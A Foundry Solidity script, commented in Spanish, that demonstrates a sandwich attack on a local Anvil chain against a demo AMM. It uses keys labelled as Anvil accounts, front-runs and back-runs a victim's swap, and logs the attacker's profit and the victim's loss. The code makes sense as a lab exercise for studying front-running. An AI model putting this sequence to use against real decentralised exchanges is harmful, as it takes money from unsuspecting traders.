// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/AMM.sol";

interface IUSD is IERC20 {
    function mint(address to, uint256 amount) external;
}

/// @title Script que ejecuta un Sandwich Attack en Anvil
contract SandwichAttackScript is Script {
    function run() external {
        // Direcciones de los contratos (deben estar deployados)
        address usdAddress = vm.envAddress("USD_ADDRESS");
        address ammAddress = vm.envAddress("AMM_ADDRESS");

        IUSD usd = IUSD(usdAddress);
        AMM amm = AMM(payable(ammAddress));

        // Cuentas de Anvil:
        // [0] Deployer/Owner: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
        // [1] Attacker:       0x70997970C51812dc3A010C7d01b50e0d17dc79C8
        // [2] Victim:         0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

        uint256 attackerKey = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
        uint256 victimKey = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;

        address attacker = vm.addr(attackerKey);
        address victim = vm.addr(victimKey);

        console.log("\n========== SANDWICH ATTACK EN ANVIL ==========\n");
        console.log("AMM:", ammAddress);
        console.log("USD:", usdAddress);
        console.log("Attacker:", attacker);
        console.log("Victim:", victim);

        // Setup: Dar USD a victima y atacante (como owner)
        uint256 ownerKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        vm.startBroadcast(ownerKey);
        usd.mint(attacker, 100_000 * 1e18);
        usd.mint(victim, 50_000 * 1e18);
        vm.stopBroadcast();

        // Montos
        uint256 victimUsdToSwap = 6000 * 1e18;
        uint256 attackerUsdToSwap = 100_000 * 1e18;

        // Estado inicial
        console.log("\n=== ESTADO INICIAL ===");
        _logReserves(amm);
        uint256 attackerUsdInitial = usd.balanceOf(attacker);
        uint256 victimEthWithoutAttack = _simulateSwapUsdToEth(amm, victimUsdToSwap);
        console.log("Sin ataque, victima recibiria: %s mETH", victimEthWithoutAttack / 1e15);

        // =====================================================================
        // PASO 1: FRONT-RUN
        // =====================================================================
        console.log("\n=== PASO 1: FRONT-RUN ===");
        console.log("Atacante compra ETH con %s USD", attackerUsdToSwap / 1e18);

        vm.startBroadcast(attackerKey);
        usd.approve(ammAddress, attackerUsdToSwap);
        uint256 attackerEthReceived = amm.tokenToEthSwap(attackerUsdToSwap, 0);
        vm.stopBroadcast();

        console.log("ETH recibido: %s mETH", attackerEthReceived / 1e15);
        _logReserves(amm);

        // =====================================================================
        // PASO 2: TX VICTIMA
        // =====================================================================
        console.log("\n=== PASO 2: TX VICTIMA ===");
        console.log("Victima compra ETH con %s USD", victimUsdToSwap / 1e18);

        vm.startBroadcast(victimKey);
        usd.approve(ammAddress, victimUsdToSwap);
        uint256 victimEthReceived = amm.tokenToEthSwap(victimUsdToSwap, 0);
        vm.stopBroadcast();

        console.log("ETH recibido: %s mETH", victimEthReceived / 1e15);
        _logReserves(amm);

        // =====================================================================
        // PASO 3: BACK-RUN
        // =====================================================================
        console.log("\n=== PASO 3: BACK-RUN ===");
        console.log("Atacante vende %s mETH", attackerEthReceived / 1e15);

        vm.startBroadcast(attackerKey);
        uint256 attackerUsdReceived = amm.ethToTokenSwap{value: attackerEthReceived}(0);
        vm.stopBroadcast();

        console.log("USD recibido: %s", attackerUsdReceived / 1e18);
        _logReserves(amm);

        // =====================================================================
        // RESULTADO
        // =====================================================================
        console.log("\n========== RESULTADO ==========\n");

        uint256 attackerUsdFinal = usd.balanceOf(attacker);
        uint256 profit = attackerUsdFinal - attackerUsdInitial;
        uint256 victimLoss = victimEthWithoutAttack - victimEthReceived;

        console.log("=== ATACANTE ===");
        console.log("USD inicial: %s", attackerUsdInitial / 1e18);
        console.log("USD final: %s", attackerUsdFinal / 1e18);
        console.log("GANANCIA: %s USD", profit / 1e18);

        console.log("\n=== VICTIMA ===");
        console.log("ETH esperado: %s mETH", victimEthWithoutAttack / 1e15);
        console.log("ETH recibido: %s mETH", victimEthReceived / 1e15);
        console.log("PERDIDA: %s mETH", victimLoss / 1e15);
    }

    function _logReserves(AMM amm) internal view {
        (uint256 ethRes, uint256 usdRes) = amm.getReserves();
        uint256 price = (usdRes * 1e18) / ethRes;
        console.log("Reservas: %s ETH, %s USD | Precio: %s USD/ETH", 
            ethRes / 1e18, usdRes / 1e18, price / 1e18);
    }

    function _simulateSwapUsdToEth(AMM amm, uint256 usdAmount) internal view returns (uint256) {
        (uint256 ethReserve, uint256 usdReserve) = amm.getReserves();
        return (usdAmount * ethReserve) / (usdReserve + usdAmount);
    }
}
